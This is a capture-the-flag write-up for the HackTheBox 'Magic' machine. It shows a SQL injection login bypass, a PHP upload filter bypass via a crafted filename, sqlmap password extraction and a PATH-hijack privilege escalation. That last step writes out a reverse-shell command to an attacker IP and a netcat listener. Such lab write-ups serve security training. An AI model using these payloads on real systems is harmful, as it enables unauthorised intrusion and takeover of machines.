# HackTheBox - Magic

I started with a simple portscan.

`nmap -sS -sV -T4 10.10.10.185`

![Screenshot0](./screenshots/0.png)

We see an open web server and an open SSH server.

Let's take a closer look at the web server.
The box was pretty straightforward, I didn't have to enumerate much.

![Screenshot1](./screenshots/1.png)

At the bottom left we see *Please Login, to upload images.*

![Screenshot2](./screenshots/2.png)

The login portal was vulnerable to __SQL Injection__.
I quickly found a simple bypass and was able to log in.

`admin'#` and we are in.

![Screenshot3](./screenshots/3.png)

We have the possibility to upload pictures.
And our uploads end up under the following path: `/images/uploads/`

The application checks if we upload only images.
Otherwise the following JS-alert greets us.

![Screenshot4](./screenshots/4.png)

Using Burp I tried to find a working bypass to upload PHP code.
After a few tries I found the following working bypass.

`<FILENAME>.php%0a.png`

![Screenshot5](./screenshots/5.png)

It is important that we prefix `PNG` with .
Also we have to url-encode `%0a` again when calling our PHP code.

And lo and behold, it works!

![Screenshot6](./screenshots/6.png)

I repeated the process and uploaded a simple webshell from which I then established a reverse shell.

![Screenshot7](./screenshots/7.png)

## PrivEsc 1: www-data -> theseus

I was `www-data` and enumerated the system.
For the user `theseus` I first tried a password which I discovered in a php configuration file but it did not work.

So back to our SQL vulnerability!

I used `sqlmap` to exploit the vulnerability and to see if we could find working any passwords.

![Screenshot8](./screenshots/8.png)

__Password Reusing__ now brought me to the Linux user `theseus`.

![Screenshot9](./screenshots/9.png)

## PrivEsc 2: theseus -> root

After searching for SUID binaries I found an interesting binary.

![Screenshot10](./screenshots/10.png)

`/bin/sysinfo`, a custom binary that shows us various system information when run.

`ltrace /bin/sysinfo`

![Screenshot11](./screenshots/11.png)

The binary uses `fdisk` among other things.

With the following steps I use the PATH variable to get root.

- `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1' > /tmp/fdisk`
- `chmod +x /tmp/fdisk`
- `nc -nlvp 1234`
- `export PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"`
- `/bin/sysinfo`

I got a shell as root on my new listener and got the root flag.

![Screenshot12](./screenshots/12.png)
